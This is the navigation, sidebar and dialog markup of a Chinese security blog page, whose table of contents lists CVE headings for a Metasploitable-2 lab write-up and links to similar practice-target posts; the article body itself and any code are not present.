text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-pen-nib" aria-hidden="true"></i>文章</a><a href="/blog/categories" aria-label="分类" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-layer-group" aria-hidden="true"></i>分类</a><a href="/blog/tags" aria-label="标签" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-tags" aria-hidden="true"></i>标签</a><a href="/blog/archives" aria-label="归档" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-solid fa-flag" aria-hidden="true"></i>归档</a><a href="/blog/friends" aria-label="友链" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-link" aria-hidden="true"></i>友链</a><a href="/blog/about" aria-label="关于" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-user" aria-hidden="true"></i>关于</a></div></div></div><div class="sider-slot hidden" data-slot-type="directory"><nav class="toc-container max-h-[90dvh] overflow-auto " aria-label="文章目录"><div class="space-y-1 pr-2"><div class="heading-tree-item relative"><a href="#mehod1cve-2007-2447" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Mehod1:CVE-2007-2447"><span class="heading-text block flex-1 truncate leading-relaxed">Mehod1:CVE-2007-2447</span></a></div><div class="heading-tree-item relative"><a href="#method2cve-2011-2523" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Method2:CVE-2011-2523"><span class="heading-text block flex-1 truncate leading-relaxed">Method2:CVE-2011-2523</span></a></div><div class="heading-tree-item relative"><a href="#method3cve-2004-2687" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Method3:CVE-2004-2687"><span class="heading-text block flex-1 truncate leading-relaxed">Method3:CVE-2004-2687</span></a></div><div class="heading-tree-item relative"><a href="#method4cve-2012-1823" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Method4:CVE-2012-1823"><span class="heading-text block flex-1 truncate leading-relaxed">Method4:CVE-2012-1823</span></a></div><div class="heading-tree-item relative"><a href="#enclosure" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Enclosure"><span class="heading-text block flex-1 truncate leading-relaxed">Enclosure</span></a></div></div></nav></div><div class="sider-slot hidden" data-slot-type="series"><div class="flex flex-col gap-1"><a href="/blog/post/20" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">CVE-2020-15778-OpenSSH命令注入漏洞复现</span></a><a href="/blog/post/13" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Kioptrix level 3</span></a><a href="/blog/post/12" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Kioptrix level 2</span></a><a href="/blog/post/10" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Kioptrix level 1</span></a><a href="/blog/post/11" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50 text-primary font-medium"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-primary"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-primary">Metasploitable-2</span></a><a href="/blog/post/9" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Mr-Robot</span></a><a href="/blog/post/8" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">GodenEye</span></a><a href="/blog/post/4" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Metasploitable-1</span></a><a href="/blog/post/3" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Redis未授权访问</span></a></div></div></div><div class="border-border mt-4 flex flex-col gap-3 border-t pt-4 md:mt-0 md:pt-2 w-full px-2"><div class="flex items-center justify-between gap-2"><a href="/blog/post/10" class="group flex items-center gap-1.5 rounded-md px-2 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary max-w-[45%] min-w-0 flex-1" title="Kioptrix level 1"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4 shrink-0" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M10.8284 12.0007L15.7782 16.9504L14.364 18.3646L8 12.0007L14.364 5.63672L15.7782 7.05093L10.8284 12.0007Z"></path></svg><span class="truncate text-xs">Kioptrix level 1</span></a><a href="/blog/post/9" class="group flex items-center gap-1.5 rounded-md px-2 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary max-w-[45%] min-w-0 flex-1 justify-end text-right" title="Mr-Robot"><span class="truncate text-xs">Mr-Robot</span><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4 shrink-0" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path></svg></a></div><div class="flex justify-center gap-2"><button class="flex items-center justify-center gap-1.5 rounded-md px-3 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary text-xs" title="回到顶部" aria-label="回到顶部"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M11.9999 10.8284L7.0502 15.7782L5.63599 14.364L11.9999 8L18.3639 14.364L16.9497 15.7782L11.9999 10.8284Z"></path></svg>回到顶部</button><button class="flex items-center justify-center gap-1.5 rounded-md px-3 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary text-xs" title="滚到底部" aria-label="滚到底部"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M11.9999 13.1714L16.9497 8.22168L18.3639 9.63589L11.9999 15.9999L5.63599 9.63589L7.0502 8.22168L11.9999 13.1714Z"></path></svg>滚到底部</button></div></div><div class="mt-auto w-full rounded-full pt-4 sticky bottom-0"><div class="bg-primary h-1 origin-left rounded-full scale-x-0"></div></div><!--astro:end--></astro-island> </div> </astro-slot></div></div><!--astro:end--></astro-island> <!-- 遮罩层 --><div id="search-overlay" data-state="closed" class="fixed inset-0 z-40 bg-black/50 opacity-0 backdrop-blur-sm transition-opacity duration-200 data-[state=closed]:hidden" role="presentation" aria-hidden="true"></div> <!-- 搜索对话框 --> <div id="search-dialog" data-state="closed" class="fixed inset-0 z-50 grid place-items-center px-4 data-[state=closed]:hidden" role="dialog" aria-label="搜索文章" aria-modal="true"> <div id="search-dialog-content" class="bg-gradient-start shadow-box w-full max-w-3xl overflow-auto rounded-xl opacity-0 transition-all duration-200"> <div class="relative p-6 md:p-3"> <div class="search-dialog"> <!-- Header --> <div class="relative mb-4 flex items-center justify-between"> <h2 class="flex items-center gap-2 text-lg font-semibold md:text-base"> <i class="fa-solid fa-magnifying-glass text-base md:text-sm" aria-hidden="true"></i>
搜索文章
</h2> <button id="search-dialog-close" class="flex size-8 items-center justify-center rounded-full bg-black/5 transition-colors duration-300 hover:bg-black/10 md:size-7 dark:bg-white/10 dark:hover:bg-white/20" aria-label="关闭搜索"> <i class="fa-solid fa-xmark text-base md:text-sm" aria-hidden="true"></i> </button> </div> <div id="search-empty-hint" class="search-empty-hint absolute inset-x-0 top-32 text-center text-sm opacity-60 md:top-28"> <p>输入关键词搜索博客文章</p> <p class="mt-1 text-xs">
按 <kbd class="rounded bg-black/10 px-1.5 py-0.5 font-mono dark:bg-white/10">ESC</kbd> 关闭
</p> </div> <!-- Search Content Area --> <div class="vertical-scrollbar scroll-feather-mask -mx-6 h-[calc(80dvh-140px)] overflow-auto scroll-smooth px-6 pb-10 md:-mx-3 md:h-[calc(80dvh-120px)] md:px-3"> <!-- Search Container --> <div id="search-dialog-container"></div> </div> </div> <!-- Keyboard hints --> <div class="bg-background/2 absolute inset-x-0 bottom-0 z-10 flex items-center justify-center gap-4 px-4 pt-2 pb-4 text-xs text-black/50 dark:border-white/10 dark:text-white/50"> <span><kbd class="kbd">↑↓</kbd> 选择</span> <span><kbd class="kbd">Enter</kbd> 打开</span> <span><kbd class="kbd">ESC</kbd> 关闭</span> </div> </div> </div> </div> <script type="module" src="/_astro/SearchDialog.astro_astro_type_script_index_0_lang.B0CSJxN3.js"></script>  <!-- 遮罩层 --><div id="code-fullscreen-overlay" data-state="closed" class="fixed inset-0 z-40 bg-black/80 opacity-0 backdrop-blur-sm transition-opacity duration-200 data-[state=closed]:hidden" role="presentation" aria-hidden="true"></div> <!-- 代码全屏对话框 --> <div id="code-fullscreen-dialog" data-state="closed" class="fixed inset-0 z-50 grid place-items-center px-4 data-[state=closed]:hidden" role="dialog" aria-label="代码全屏预览" aria-modal="true"> <div id="code-fullscreen-content" class="bg-background relative flex h-[85vh] w-[90vw] max-w-6xl flex-col overflow-hidden rounded-xl opacity-0 shadow-2xl transition-opacity duration-200 md:max-w-[90vw]"> <!-- Toolbar --> <div class="border-border bg-muted/50 flex shrink-0 items-center justify-between border-b px-4 py-3 backdrop-blur-sm"> <div class="flex items-center gap-3"> <div class="flex gap-2"> <span class="h-3 w-3 rounded-full bg-[#ff5f56]"></span> <span class="h-3 w-3 rounded-full bg-[#ffbd2e]"></span> <span class="h-3 w-3 rounded-full bg-[#27c93f]"></span> </div> <span id="code-fullscreen-language" class="text-muted-foreground font-mono text-xs font-medium tracking-wider uppercase">
text
</span> </div> <div class="flex items-center gap-1"> <button id="code-fullscreen-copy" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground flex items-center gap-2 rounded-md px-3 py-1.5 transition-colors"> <!-- Copy icon --> <svg id="code-fullscreen-copy-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 448 512" fill="currentColor"> <path d="M192 0c-35.3 0-64 28.7-64 64l0 256c0 35.3 28.7 64 64 64l192 0c35.3 0 64-28.7 64-64l0-200.6c0-17.4-7.1-34.1-19.7-46.2L370.6 17.8C358.7 6.4 342.8 0 326.3 0L192 0zM64 128c-35.3 0-64 28.7-64 64L0 448c0 35.3 28.7 64 64 64l192 0c35.3 0 64-28.7 64-64l0-16-64 0 0 16-192 0 0-256 16 0 0-64-16 0z"></path> </svg> <!-- Checkmark icon (hidden by default) --> <svg id="code-fullscreen-check-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="hidden"> <mask id="checkmark-anim-fullscreen"> <g fill="none" stroke="#fff" stroke-dasharray="24" stroke-dashoffset="24" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"> <path d="M2 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" dur="0.4s" values="24;0"></animate> </path> <path stroke="#000" stroke-width="6" d="M7.5 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.4s" dur="0.4s" values="24;0"></animate> </path> <path d="M7.5 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.4s" dur="0.4s" values="24;0"></animate> </path> </g> </mask> <rect width="24" height="24" fill="currentColor" mask="url(#checkmark-anim-fullscreen)"></rect> </svg> <span id="code-fullscreen-copy-text" class="text-sm">复制</span> </button> <button id="code-fullscreen-close" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground rounded-md p-2 transition-colors" aria-label="关闭"> <i class="fa-solid fa-xmark text-base" aria-hidden="true"></i> </button> </div> </div> <!-- Code Content --> <div class="scroll-feather-mask flex-1 overflow-auto"> <pre id="code-fullscreen-pre" class="p-4"><code id="code-fullscreen-code"></code></pre> </div> </div> </div> <script type="module" src="/_astro/CodeBlockFullscreen.astro_astro_type_script_index_0_lang.BUCnEfx7.js"></script> <!-- Overlay --><div id="mermaid-fullscreen-overlay" data-state="closed" class="fixed inset-0 z-40 bg-black/80 opacity-0 backdrop-blur-sm transition-opacity duration-200 data-[state=closed]:hidden" role="presentation" aria-hidden="true"></div> <!-- Mermaid Fullscreen Dialog --> <div id="mermaid-fullscreen-dialog" data-state="closed" class="fixed inset-0 z-50 grid place-items-center px-4 data-[state=closed]:hidden" role="dialog" aria-label="Mermaid diagram fullscreen" aria-modal="true"> <div id="mermaid-fullscreen-content" class="bg-background relative flex h-[85vh] w-[90vw] max-w-6xl flex-col overflow-hidden rounded-xl opacity-0 shadow-2xl transition-opacity duration-200 md:max-w-[90vw]"> <!-- Toolbar --> <div class="border-border bg-muted/50 flex shrink-0 items-center justify-between border-b px-4 py-3 backdrop-blur-sm"> <div class="flex items-center gap-3"> <div class="flex gap-2"> <span class="h-3 w-3 rounded-full bg-[#ff5f56]"></span> <span class="h-3 w-3 rounded-full bg-[#ffbd2e]"></span> <span class="h-3 w-3 rounded-full bg-[#27c93f]"></span> </div> <span class="text-muted-foreground font-mono text-xs font-medium tracking-wider uppercase"> mermaid </span> </div> <div class="flex items-center gap-1"> <!-- Zoom info --> <span id="mermaid-zoom-level" class="text-muted-foreground mr-2 text-sm">100%</span> <!-- Reset zoom button --> <button id="mermaid-fullscreen-reset" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground flex items-center gap-2 rounded-md px-3 py-1.5 transition-colors" title="Reset zoom"> <i class="fa-solid fa-rotate-right text-sm" aria-hidden="true"></i> </button> <!-- Copy button --> <button id="mermaid-fullscreen-copy" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground flex items-center gap-2 rounded-md px-3 py-1.5 transition-colors"> <svg id="mermaid-fullscreen-copy-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 448 512" fill="currentColor"> <path d="M192 0c-35.3 0-64 28.7-64 64l0 256c0 35.3 28.7 64 64 64l192 0c35.3 0 64-28.7 64-64l0-200.6c0-17.4-7.1-34.1-19.7-46.2L370.6 17.8C358.7 6.4 342.8 0 326.3 0L192 0zM64 128c-35.3 0-64 28.7-64 64L0 448c0 35.3 28.7 64 64 64l192 0c35.3 0 64-28.7 64-64l0-16-64 0 0 16-192 0 0-256 16 0 0-64-16 0z"></path> </svg> <svg id="mermaid-fullscreen-check-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="hidden"> <mask id="checkmark-anim-mermaid-fullscreen"> <g fill="none" stroke="#fff" stroke-dasharray="24" stroke-dashoffset="24" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"> <path d="M2 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" dur="0.4s" values="24;0"></animate> </path> <path stroke="#000" stroke-width="6" d="M7.5 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.4s" dur="0.4s" values="24;0"></animate> </path> <path d="M7.5 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.4s" dur="0.4s" values="24;0"></animate> </path> </g> </mask> <rect width="24" height="24" fill="currentColor" mask="url(#checkmark-anim-mermaid-fullscreen)"></rect> </svg> <span id="mermaid-fullscreen-copy-text" class="text-sm">Copy</span> </button> <!-- Close button --> <button id="mermaid-fullscreen-close" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground rounded-md p-2 transition-colors" aria-label="Close"> <i class="fa-solid fa-xmark text-base" aria-hidden="true"></i> </button> </div> </div> <!-- SVG Container with zoom/pan --> <div id="mermaid-fullscreen-viewport" class="flex flex-1 cursor-grab items-center justify-center overflow-hidden active:cursor-grabbing"> <div id="mermaid-fullscreen-svg" class="mermaid-svg-container origin-center transition-transform duration-100"></div> </div> </div> </div> <script type="module" src="/_astro/MermaidFullscreen.astro_astro_type_script_index_0_lang.DIkgBJYA.js"></script> </div> </body></html>